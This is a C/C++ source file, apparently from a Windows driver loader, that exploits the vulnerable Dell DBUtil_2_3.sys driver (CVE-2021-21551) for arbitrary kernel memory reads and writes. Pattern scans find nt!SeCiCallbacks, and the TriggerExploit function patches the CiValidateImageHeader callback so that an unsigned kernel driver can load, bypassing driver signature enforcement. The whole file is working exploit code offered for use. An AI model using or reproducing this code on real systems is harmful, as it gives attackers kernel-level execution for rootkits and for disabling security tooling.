#include "global.h"
#include "hde/hde64.h"
#include <shlwapi.h>
#include <devioctl.h>
#include <Psapi.h>


#define EQUALS(a, b)				(RtlCompareMemory(a, b, sizeof(b) - 1) == (sizeof(b) - 1))
#define NT_MACHINE					L"\\Registry\\Machine\\"
#define SVC_BASE					NT_MACHINE L"System\\CurrentControlSet\\Services\\"

// Dell DBUtil_2_3.sys driver (CVE-2021-21551) device name and IOCTL
#define DBUTIL_DEVICE_NAME		L"\\Device\\DBUtil_2_3"
#define IOCTL_DBUTIL			0x9B0C1EC4

// DBUtil virtual memory operations
#define DBUTIL_READ_VIRTUAL		2
#define DBUTIL_WRITE_VIRTUAL	3

// Input struct for IOCTL_DBUTIL (48 bytes)
typedef struct _DBUTIL_IO_REQUEST
{
	ULONG64 Pad0;
	ULONG64 Operation;		// 2 = read virtual, 3 = write virtual
	ULONG64 Address;		// kernel virtual address
	ULONG64 Pad1;
	ULONG64 Buffer;		// user-mode buffer pointer
	ULONG64 Size;			// size in bytes
} DBUTIL_IO_REQUEST, *PDBUTIL_IO_REQUEST;

struct seCiCallbacks_swap
{
	DWORD64 ciValidateImageHeaderEntry;
	DWORD64 zwFlushInstructionCache;
};

static WCHAR DriverServiceName[MAX_PATH], LoaderServiceName[MAX_PATH];

static
NTSTATUS
FindKernelModule(
	_In_ PCCH ModuleName,
	_Out_ PULONG_PTR ModuleBase
	)
{
	*ModuleBase = 0;

	ULONG Size = 0;
	NTSTATUS Status;
	if ((Status = NtQuerySystemInformation(SystemModuleInformation, nullptr, 0, &Size)) != STATUS_INFO_LENGTH_MISMATCH)
		return Status;
	
	const PRTL_PROCESS_MODULES Modules = static_cast<PRTL_PROCESS_MODULES>(RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, 2 * static_cast<SIZE_T>(Size)));
	Status = NtQuerySystemInformation(SystemModuleInformation,
										Modules,
										2 * Size,
										nullptr);
	if (!NT_SUCCESS(Status))
		goto Exit;

	for (ULONG i = 0; i < Modules->NumberOfModules; ++i)
	{
		RTL_PROCESS_MODULE_INFORMATION Module = Modules->Modules[i];
		if (_stricmp(ModuleName, reinterpret_cast<PCHAR>(Module.FullPathName) + Module.OffsetToFileName) == 0)
		{
			*ModuleBase = reinterpret_cast<ULONG_PTR>(Module.ImageBase);
			Status = STATUS_SUCCESS;
			break;
		}
	}

Exit:
	RtlFreeHeap(RtlProcessHeap(), 0, Modules);
	return Status;
}

ULONG_PTR GetKernelModuleAddress(const char* name) {

	DWORD size = 0;
	void* buffer = NULL;
	PRTL_PROCESS_MODULES modules;

	NTSTATUS status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, buffer, size, &size);

	while (status == STATUS_INFO_LENGTH_MISMATCH) {
		VirtualFree(buffer, 0, MEM_RELEASE);

		buffer = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, buffer, size, &size);
	}

	if (!NT_SUCCESS(status))
	{
		VirtualFree(buffer, 0, MEM_RELEASE);
		return NULL;
	}

	modules = (PRTL_PROCESS_MODULES)buffer;

	for (int i = 0; i < modules->NumberOfModules; i++)
	{
		char* currentName = (char*)modules->Modules[i].FullPathName + modules->Modules[i].OffsetToFileName;

		if (!_stricmp(currentName, name)) {
			ULONG_PTR result = (ULONG_PTR)modules->Modules[i].ImageBase;

			VirtualFree(buffer, 0, MEM_RELEASE);
			return result;
		}
	}

	VirtualFree(buffer, 0, MEM_RELEASE);
	return NULL;
}


// Masked pattern match: 0xFF in mask = byte must match, 0x00 = wildcard, partial masks (e.g. 0xF8) match masked bits
struct SigPattern {
	unsigned char bytes[16];
	unsigned char mask[16];
	int length;
	int leaOffset; // offset within pattern to the 4C 8D 05 (lea r8) instruction
};

// Patterns for finding "lea r8, [nt!SeCiCallbacks]" across Windows 10/11 builds.
// The LEA is always 4C 8D 05 [disp32]. The preceding instruction(s) vary by build.
// Ordered from most specific to broadest to minimize false positives.
static const SigPattern g_CiPatterns[] = {
	// --- Exact patterns seen in specific builds ---
	// 1: FF 48 8B D3 4C 8D 05 - (original) tail of call + mov rdx, rbx; lea r8
	{ {0xFF, 0x48, 0x8B, 0xD3, 0x4C, 0x8D, 0x05},
	  {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}, 7, 4 },
	// 2: 48 8B D3 4C 8D 05 - mov rdx, rbx; lea r8
	{ {0x48, 0x8B, 0xD3, 0x4C, 0x8D, 0x05},
	  {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}, 6, 3 },
	// 3: 48 8B D6 4C 8D 05 - mov rdx, rsi; lea r8
	{ {0x48, 0x8B, 0xD6, 0x4C, 0x8D, 0x05},
	  {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}, 6, 3 },
	// 4: 48 8B D7 4C 8D 05 - mov rdx, rdi; lea r8
	{ {0x48, 0x8B, 0xD7, 0x4C, 0x8D, 0x05},
	  {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}, 6, 3 },
	// 5: 8B D3 4C 8D 05 - mov edx, ebx; lea r8
	{ {0x8B, 0xD3, 0x4C, 0x8D, 0x05},
	  {0xFF, 0xFF, 0xFF, 0xFF, 0xFF}, 5, 2 },
	// 6: 8B D6 4C 8D 05 - mov edx, esi; lea r8
	{ {0x8B, 0xD6, 0x4C, 0x8D, 0x05},
	  {0xFF, 0xFF, 0xFF, 0xFF, 0xFF}, 5, 2 },
	// 7: 33 D2 4C 8D 05 - xor edx, edx; lea r8
	{ {0x33, 0xD2, 0x4C, 0x8D, 0x05},
	  {0xFF, 0xFF, 0xFF, 0xFF, 0xFF}, 5, 2 },

	// --- Win11 23H2/24H2 patterns ---
	// 8: 48 8D 15 ?? ?? ?? ?? 4C 8D 05 - lea rdx, [rip+xxx]; lea r8 (seen in 23H2+)
	{ {0x48, 0x8D, 0x15, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x05},
	  {0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF}, 10, 7 },
	// 9: 48 8D 0D ?? ?? ?? ?? 4C 8D 05 - lea rcx, [rip+xxx]; lea r8
	{ {0x48, 0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x05},
	  {0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF}, 10, 7 },
	// 10: 45 33 C9 4C 8D 05 - xor r9d, r9d; lea r8 (4th param zeroed)
	{ {0x45, 0x33, 0xC9, 0x4C, 0x8D, 0x05},
	  {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}, 6, 3 },
	// 11: 44 89 ?? 4C 8D 05 - mov [rsp+?], r?d; lea r8 (register spill before call)
	{ {0x44, 0x89, 0x00, 0x4C, 0x8D, 0x05},
	  {0xFF, 0xFF, 0x00, 0xFF, 0xFF, 0xFF}, 6, 3 },

	// --- Broad wildcard patterns ---
	// 12: E8 ?? ?? ?? ?? 4C 8D 05 - call rel32; lea r8
	{ {0xE8, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x05},
	  {0xFF, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF}, 8, 5 },
	// 13: FF 15 ?? ?? ?? ?? 4C 8D 05 - call [rip+disp32]; lea r8
	{ {0xFF, 0x15, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x05},
	  {0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF}, 9, 6 },
	// 14: 48 8B D? 4C 8D 05 - mov rdx, <any 64-bit gpr>; lea r8 (mask 0xF8)
	{ {0x48, 0x8B, 0xD0, 0x4C, 0x8D, 0x05},
	  {0xFF, 0xFF, 0xF8, 0xFF, 0xFF, 0xFF}, 6, 3 },
	// 15: 8B D? 4C 8D 05 - mov edx, <any 32-bit gpr>; lea r8 (mask 0xF8)
	{ {0x8B, 0xD0, 0x4C, 0x8D, 0x05},
	  {0xFF, 0xF8, 0xFF, 0xFF, 0xFF}, 5, 2 },
};

static DWORD64 maskedPatternScan(DWORD64 base, DWORD imageSize, const SigPattern* sig)
{
	for (unsigned int i = 0; i + sig->length <= imageSize; i++)
	{
		bool match = true;
		for (int j = 0; j < sig->length; j++)
		{
			unsigned char chr = *(unsigned char*)(base + i + j);
			if ((chr & sig->mask[j]) != (sig->bytes[j] & sig->mask[j]))
			{
				match = false;
				break;
			}
		}
		if (match)
			return base + i + sig->leaOffset;
	}
	return 0;
}

// Resolve a RIP-relative LEA target using 32-bit math to prevent carry
static DWORD64 resolveLeaTarget(DWORD64 leaAddr)
{
	DWORD32 disp = *(DWORD32*)(leaAddr + 3);
	DWORD32 instrLow = (DWORD32)leaAddr;
	DWORD32 targetLow = instrLow + 7 + disp;
	return (leaAddr & 0xFFFFFFFF00000000) + targetLow;
}

// Fallback: scan executable sections for LEA R8 (4C 8D 05) targeting the .data section
static DWORD64 heuristicLeaScan(DWORD64 base, DWORD imageSize)
{
	IMAGE_DOS_HEADER* dosHdr = (IMAGE_DOS_HEADER*)base;
	IMAGE_NT_HEADERS64* ntHdr = (IMAGE_NT_HEADERS64*)(base + dosHdr->e_lfanew);
	IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*)((char*)ntHdr + sizeof(IMAGE_NT_HEADERS64));

	// Locate the .data section (where SeCiCallbacks lives)
	DWORD64 dataStart = 0, dataSize = 0;
	for (int s = 0; s < ntHdr->FileHeader.NumberOfSections; s++)
	{
		if (memcmp(sections[s].Name, ".data", 5) == 0)
		{
			dataStart = base + sections[s].VirtualAddress;
			dataSize = sections[s].Misc.VirtualSize;
			break;
		}
	}
	if (dataStart == 0)
		return 0;

	// Search only executable sections (PAGE, .text, INIT) to reduce false positives
	for (int s = 0; s < ntHdr->FileHeader.NumberOfSections; s++)
	{
		if (!(sections[s].Characteristics & IMAGE_SCN_MEM_EXECUTE))
			continue;

		DWORD64 secBase = base + sections[s].VirtualAddress;
		DWORD secSize = sections[s].Misc.VirtualSize;

		for (unsigned int i = 0; i + 7 <= secSize; i++)
		{
			// Look for 4C 8D 05 (lea r8, [rip+disp32])
			if (*(unsigned char*)(secBase + i) != 0x4C ||
				*(unsigned char*)(secBase + i + 1) != 0x8D ||
				*(unsigned char*)(secBase + i + 2) != 0x05)
				continue;

			DWORD64 leaAddr = secBase + i;
			DWORD64 target = resolveLeaTarget(leaAddr);

			// Target must be in .data with room for the struct (0x28 bytes for CiValidateImageHeader at +0x20)
			if (target < dataStart || target + 0x28 > dataStart + dataSize)
				continue;

			// Heuristic: next instruction should be call (E8/FF) or mov/lea (48/4C/41/44/45/89/8B/33)
			// typical of the SepInitializeCodeIntegrity -> CiInitialize call sequence
			unsigned char nextByte = *(unsigned char*)(leaAddr + 7);
			if (nextByte == 0xE8 || nextByte == 0xFF || nextByte == 0x48 ||
				nextByte == 0x4C || nextByte == 0x41 || nextByte == 0x44 ||
				nextByte == 0x45 || nextByte == 0x89 || nextByte == 0x8B ||
				nextByte == 0x33)
				return leaAddr;
		}
	}
	return 0;
}

seCiCallbacks_swap getCiValidateImageHeaderEntry()
{
	Printf(L"[*] Windows NT %lu.%lu (Build %lu)\n",
		RtlNtMajorVersion(), RtlNtMinorVersion(),
		*reinterpret_cast<PULONG>(0x7FFE0000 + 0x0260) & 0xFFFF); // NtBuildNumber from SharedUserData

	Printf(L"[!] Searching pattern...\n");

	// Get ntoskrnl base in kernel
	ULONG_PTR kModuleBase = GetKernelModuleAddress("ntoskrnl.exe");
	if (kModuleBase == 0)
	{
		Printf(L"[!] Failed to find ntoskrnl.exe kernel base address\n");
		return seCiCallbacks_swap{ 0, 0 };
	}
	Printf(L"[*] Kernel ntoskrnl base : %p\n", kModuleBase);

	// Load ntoskrnl.exe into usermode and resolve its base
	HMODULE uNt = LoadLibraryEx(L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (uNt == NULL)
	{
		Printf(L"[!] Failed to load ntoskrnl.exe into usermode\n");
		return seCiCallbacks_swap{ 0, 0 };
	}
	DWORD64 uNtAddr = (DWORD64)uNt;

	// Get the actual mapped size of the module
	MODULEINFO modinfo;
	if (!GetModuleInformation(GetCurrentProcess(), uNt, &modinfo, sizeof(modinfo)))
	{
		Printf(L"[!] GetModuleInformation failed\n");
		FreeLibrary(uNt);
		return seCiCallbacks_swap{ 0, 0 };
	}
	Printf(L"[*] Usermode ntoskrnl    : %p (size 0x%X)\n", uNtAddr, modinfo.SizeOfImage);

	// Try each known pattern for lea r8, [nt!SeCiCallbacks]
	DWORD64 seCiCallbacksInstr = 0;
	int numPatterns = sizeof(g_CiPatterns) / sizeof(g_CiPatterns[0]);
	for (int p = 0; p < numPatterns && seCiCallbacksInstr == 0; p++)
	{
		seCiCallbacksInstr = maskedPatternScan(uNtAddr, modinfo.SizeOfImage, &g_CiPatterns[p]);
		if (seCiCallbacksInstr != 0)
			Printf(L"[*] Matched pattern %d/%d\n", p + 1, numPatterns);
	}

	// Fallback: heuristic scan for any LEA R8 in code sections pointing into .data
	if (seCiCallbacksInstr == 0)
	{
		Printf(L"[*] Known patterns failed, trying heuristic scan...\n");
		seCiCallbacksInstr = heuristicLeaScan(uNtAddr, modinfo.SizeOfImage);
		if (seCiCallbacksInstr != 0)
			Printf(L"[*] Heuristic scan found candidate\n");
	}

	if (seCiCallbacksInstr == 0)
	{
		Printf(L"[!] Could not find lea r8, [nt!SeCiCallbacks]\n");
		Printf(L"[!] Tried %d patterns + heuristic. Your Windows build may not be supported.\n", numPatterns);
		Printf(L"[!] Please report your build number so support can be added.\n");
		FreeLibrary(uNt);
		return seCiCallbacks_swap{ 0, 0 };
	}

	Printf(L"[*] LEA instr at         : %p\n", seCiCallbacksInstr);

	// Resolve RIP-relative LEA target using 32-bit math to prevent carry
	DWORD64 seCiCallbacksAddr = resolveLeaTarget(seCiCallbacksInstr);
	Printf(L"[*] Usermode SeCiCallbacks: %p\n", seCiCallbacksAddr);

	// Calc offset from base and apply to kernel base
	DWORD64 KernelOffset = seCiCallbacksAddr - uNtAddr;
	Printf(L"[*] Offset from base     : %p\n", KernelOffset);
	DWORD64 kernelAddress = kModuleBase + KernelOffset;
	Printf(L"[*] Kernel SeCiCallbacks : %p\n", kernelAddress);

	// Resolve kernel ZwFlushInstructionCache address (harmless stub used as replacement)
	DWORD64 uZwFlush = (DWORD64)GetProcAddress(uNt, "ZwFlushInstructionCache");
	if (uZwFlush == 0)
	{
		Printf(L"[!] Failed to resolve ZwFlushInstructionCache export\n");
		FreeLibrary(uNt);
		return seCiCallbacks_swap{ 0, 0 };
	}
	DWORD64 zwFlushInstructionCache = uZwFlush - uNtAddr + (DWORD64)kModuleBase;

	// CiValidateImageHeader entry is at offset 0x20 in the SeCiCallbacks struct
	DWORD64 ciValidateImageHeaderEntry = kernelAddress + 0x20;

	FreeLibrary(uNt);
	return seCiCallbacks_swap{
		ciValidateImageHeaderEntry,
		zwFlushInstructionCache
	};
}






static int ConvertToNtPath(PWCHAR Dst, PWCHAR Src) // TODO: holy shit this is fucking horrible
{
	wcscpy_s(Dst, sizeof(L"\\??\\") / sizeof(WCHAR), L"\\??\\");
	wcscat_s(Dst, (MAX_PATH + sizeof(L"\\??\\")) / sizeof(WCHAR), Src);
	return static_cast<int>(wcslen(Dst)) * sizeof(wchar_t) + sizeof(wchar_t);
}

static void FileNameToServiceName(PWCHAR ServiceName, PWCHAR FileName)
{
	int p = sizeof(SVC_BASE) / sizeof(WCHAR) - 1;
	wcscpy_s(ServiceName, sizeof(SVC_BASE) / sizeof(WCHAR), SVC_BASE);
	for (PWCHAR i = FileName; *i; ++i)
	{
		if (*i == L'\\')
			FileName = i + 1;
	}
	while (*FileName != L'\0' && *FileName != L'.')
		ServiceName[p++] = *FileName++;
	ServiceName[p] = L'\0';
}

static NTSTATUS CreateDriverService(PWCHAR ServiceName, PWCHAR FileName)
{
	FileNameToServiceName(ServiceName, FileName);
	NTSTATUS Status = RtlCreateRegistryKey(RTL_REGISTRY_ABSOLUTE, ServiceName);
	if (!NT_SUCCESS(Status))
		return Status;

	WCHAR NtPath[MAX_PATH];
	ULONG ServiceType = SERVICE_KERNEL_DRIVER;

	Status = RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE,
									ServiceName,
									L"ImagePath",
									REG_SZ,
									NtPath,
									ConvertToNtPath(NtPath, FileName));
	if (!NT_SUCCESS(Status))
		return Status;

	Status = RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE,
									ServiceName,
									L"Type",
									REG_DWORD,
									&ServiceType,
									sizeof(ServiceType));
	return Status;
}

static void DeleteService(PWCHAR ServiceName)
{
	// TODO: shlwapi.dll? holy fuck this is horrible
	SHDeleteKeyW(HKEY_LOCAL_MACHINE, ServiceName + sizeof(NT_MACHINE) / sizeof(WCHAR) - 1);
}



static NTSTATUS LoadDriver(PWCHAR ServiceName)
{
	UNICODE_STRING ServiceNameUcs;
	RtlInitUnicodeString(&ServiceNameUcs, ServiceName);
	return NtLoadDriver(&ServiceNameUcs);
}

static NTSTATUS UnloadDriver(PWCHAR ServiceName)
{
	UNICODE_STRING ServiceNameUcs;
	RtlInitUnicodeString(&ServiceNameUcs, ServiceName);
	return NtUnloadDriver(&ServiceNameUcs);
}

static
NTSTATUS
OpenDeviceHandle(
	_Out_ PHANDLE DeviceHandle,
	_In_ BOOLEAN PrintErrors
	)
{
	UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(DBUTIL_DEVICE_NAME);
	OBJECT_ATTRIBUTES ObjectAttributes = RTL_CONSTANT_OBJECT_ATTRIBUTES(&DeviceName, OBJ_CASE_INSENSITIVE);
	IO_STATUS_BLOCK IoStatusBlock;

	const NTSTATUS Status = NtCreateFile(DeviceHandle,
										SYNCHRONIZE,
										&ObjectAttributes,
										&IoStatusBlock,
										nullptr,
										FILE_ATTRIBUTE_NORMAL,
										FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
										FILE_OPEN,
										FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
										nullptr,
										0);

	if (!NT_SUCCESS(Status) && PrintErrors)
		Printf(L"Failed to obtain handle to device %wZ: NtCreateFile: %08X.\n", &DeviceName, Status);

	return Status;
}

// Read a QWORD from a kernel virtual address via DBUtil
static NTSTATUS ReadKernelQword(HANDLE DeviceHandle, DWORD64 Address, DWORD64* Value)
{
	DBUTIL_IO_REQUEST req = { 0 };
	req.Operation = DBUTIL_READ_VIRTUAL;
	req.Address = Address;
	req.Buffer = (ULONG64)Value;
	req.Size = sizeof(DWORD64);

	IO_STATUS_BLOCK IoStatusBlock;
	RtlZeroMemory(&IoStatusBlock, sizeof(IoStatusBlock));
	return NtDeviceIoControlFile(DeviceHandle,
		nullptr, nullptr, nullptr,
		&IoStatusBlock,
		IOCTL_DBUTIL,
		&req, sizeof(req),
		&req, sizeof(req));
}

// Write a QWORD to a kernel virtual address via DBUtil
static NTSTATUS WriteKernelQword(HANDLE DeviceHandle, DWORD64 Address, DWORD64 Value)
{
	DBUTIL_IO_REQUEST req = { 0 };
	req.Operation = DBUTIL_WRITE_VIRTUAL;
	req.Address = Address;
	req.Buffer = (ULONG64)&Value;
	req.Size = sizeof(DWORD64);

	IO_STATUS_BLOCK IoStatusBlock;
	RtlZeroMemory(&IoStatusBlock, sizeof(IoStatusBlock));
	return NtDeviceIoControlFile(DeviceHandle,
		nullptr, nullptr, nullptr,
		&IoStatusBlock,
		IOCTL_DBUTIL,
		&req, sizeof(req),
		&req, sizeof(req));
}


void* mapFileIntoMemory(const char* path) {

	HANDLE fileHandle = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (fileHandle == INVALID_HANDLE_VALUE) {
		return NULL;
	}

	HANDLE fileMapping = CreateFileMapping(fileHandle, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	if (fileMapping == NULL) {
		CloseHandle(fileHandle);
		return NULL;
	}

	void* fileMap = MapViewOfFile(fileMapping, FILE_MAP_READ, 0, 0, 0);
	if (fileMap == NULL) {
		CloseHandle(fileMapping);
		CloseHandle(fileHandle);
	}

	return fileMap;
}

void* signatureSearch(char* base, char* inSig, int length, int maxHuntLength) {
	for (int i = 0; i < maxHuntLength; i++) {
		if (base[i] == inSig[0]) {
			if (memcmp(base + i, inSig, length) == 0) {
				return base + i;
			}
		}
	}

	return NULL;
}

ULONG_PTR signatureSearchInSection(char* section, char* base, char* inSig, int length) {

	IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)base;
	IMAGE_NT_HEADERS64* ntHeaders = (IMAGE_NT_HEADERS64*)((char*)base + dosHeader->e_lfanew);
	IMAGE_SECTION_HEADER* sectionHeaders = (IMAGE_SECTION_HEADER*)((char*)ntHeaders + sizeof(IMAGE_NT_HEADERS64));
	IMAGE_SECTION_HEADER* textSection = NULL;
	ULONG_PTR gadgetSearch = NULL;

	for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
		if (memcmp(sectionHeaders[i].Name, section, strlen(section)) == 0) {
			textSection = &sectionHeaders[i];
			break;
		}
	}

	if (textSection == NULL) {
		return NULL;
	}

	gadgetSearch = (ULONG_PTR)signatureSearch(((char*)base + textSection->VirtualAddress), inSig, length, textSection->SizeOfRawData);

	return gadgetSearch;
}





static
NTSTATUS
TriggerExploit(
	_In_ PWSTR LoaderServiceName,
	_In_ PWSTR DriverServiceName
	)
{
	// First try to open the device without loading the driver (may already be loaded)
	HANDLE DeviceHandle;
	NTSTATUS Status = OpenDeviceHandle(&DeviceHandle, FALSE);
	if (!NT_SUCCESS(Status))
	{
		// Load the DBUtil loader driver
		Status = LoadDriver(LoaderServiceName);
		if (!NT_SUCCESS(Status))
		{
			Printf(L"Failed to load driver service %ls. NtLoadDriver: %08X.\n", LoaderServiceName, Status);
			return Status;
		}

		// The device should exist now. If we still can't open it, bail
		Status = OpenDeviceHandle(&DeviceHandle, TRUE);
		if (!NT_SUCCESS(Status))
			return Status;
	}

	// Resolve the SeCiCallbacks addresses
	seCiCallbacks_swap w = getCiValidateImageHeaderEntry();
	if (w.ciValidateImageHeaderEntry == 0 || w.zwFlushInstructionCache == 0)
	{
		Printf(L"[!] Failed to resolve SeCiCallbacks addresses. Aborting.\n");
		NtClose(DeviceHandle);
		return STATUS_NOT_FOUND;
	}
	Printf(L"[*] Target : %p\n", w.ciValidateImageHeaderEntry);
	Printf(L"[*] Replace: %p\n", w.zwFlushInstructionCache);

	// Read the original CiValidateImageHeader callback pointer
	DWORD64 originalCallback = 0;
	Status = ReadKernelQword(DeviceHandle, w.ciValidateImageHeaderEntry, &originalCallback);
	if (!NT_SUCCESS(Status))
	{
		Printf(L"[!] Read primitive failed: %08X\n", Status);
		goto Cleanup;
	}
	Printf(L"[*] Original Callback : %p\n", originalCallback);

	// Sanity check: the original pointer should be a valid kernel-mode address
	if (originalCallback == 0 || (originalCallback >> 48) == 0)
	{
		Printf(L"[!] Original callback looks invalid (not a kernel pointer). Aborting.\n");
		Status = STATUS_UNSUCCESSFUL;
		goto Cleanup;
	}

	// Overwrite CiValidateImageHeader with ZwFlushInstructionCache (harmless stub)
	Status = WriteKernelQword(DeviceHandle, w.ciValidateImageHeaderEntry, w.zwFlushInstructionCache);
	if (!NT_SUCCESS(Status))
	{
		Printf(L"[!] Write primitive (patch) failed: %08X\n", Status);
		goto Cleanup;
	}
	Printf(L"[*] Patched CiValidateImageHeader -> ZwFlushInstructionCache\n");

	// Load the unsigned target driver (CI check is now bypassed)
	{
		NTSTATUS LoadStatus = LoadDriver(DriverServiceName);
		if (!NT_SUCCESS(LoadStatus))
			Printf(L"[!] Failed to load driver %ls: %08X\n", DriverServiceName, LoadStatus);
		else
			Printf(L"[*] Successfully loaded unsigned driver!\n");
		// Always fall through to restore - never leave the kernel patched
	}

	// ALWAYS restore the original callback, even if driver load failed
	{
		NTSTATUS RestoreStatus = WriteKernelQword(DeviceHandle, w.ciValidateImageHeaderEntry, originalCallback);
		if (!NT_SUCCESS(RestoreStatus))
			Printf(L"[!] CRITICAL: Failed to restore callback: %08X\n", RestoreStatus);
		else
			Printf(L"[*] Restored original callback\n");
	}

Cleanup:
	UnloadDriver(LoaderServiceName);
	NtClose(DeviceHandle);
	return Status;
}

NTSTATUS
WindLoadDriver(
	_In_ PWCHAR LoaderName,
	_In_ PWCHAR DriverName,
	_In_ BOOLEAN Hidden
)
{
	WCHAR LoaderPath[MAX_PATH], DriverPath[MAX_PATH];


	// Enable privileges
	CONSTEXPR CONST ULONG SE_LOAD_DRIVER_PRIVILEGE = 10UL;
	BOOLEAN SeLoadDriverWasEnabled;
	NTSTATUS Status = RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE,
		TRUE,
		FALSE,
		&SeLoadDriverWasEnabled);
	if (!NT_SUCCESS(Status))
	{
		Printf(L"Fatal error: failed to acquire SE_LOAD_DRIVER_PRIVILEGE. Make sure you are running as administrator.\n");
		return Status;
	}

	// Expand filenames to full paths
	Status = RtlGetFullPathName_UEx(LoaderName, MAX_PATH * sizeof(WCHAR), LoaderPath, nullptr, nullptr);
	if (!NT_SUCCESS(Status))
		return Status;
	Status = RtlGetFullPathName_UEx(DriverName, MAX_PATH * sizeof(WCHAR), DriverPath, nullptr, nullptr);
	if (!NT_SUCCESS(Status))
		return Status;

	// Create the target driver service
	Status = CreateDriverService(DriverServiceName, DriverPath);
	if (!NT_SUCCESS(Status))
		return Status;

	// Create the loader driver service
	Status = CreateDriverService(LoaderServiceName, LoaderPath);
	if (!NT_SUCCESS(Status))
		return Status;
	// Patch SeCiCallbacks, load the unsigned driver, and restore
	Status = TriggerExploit(LoaderServiceName, DriverServiceName);
	return Status;
}
NTSTATUS
WindUnloadDriver(
	_In_ PWCHAR DriverName,
	_In_ BOOLEAN Hidden
	)
{
	CONSTEXPR CONST ULONG SE_LOAD_DRIVER_PRIVILEGE = 10UL;
	BOOLEAN SeLoadDriverWasEnabled;
	NTSTATUS Status = RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE,
										TRUE,
										FALSE,
										&SeLoadDriverWasEnabled);
	if (!NT_SUCCESS(Status))
		return Status;

	if (DriverName != nullptr && Hidden)
		CreateDriverService(DriverServiceName, DriverName);

	FileNameToServiceName(DriverServiceName, DriverName);

	Status = UnloadDriver(DriverServiceName);


	RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE,
						SeLoadDriverWasEnabled,
						FALSE,
						&SeLoadDriverWasEnabled);

	return Status;
}
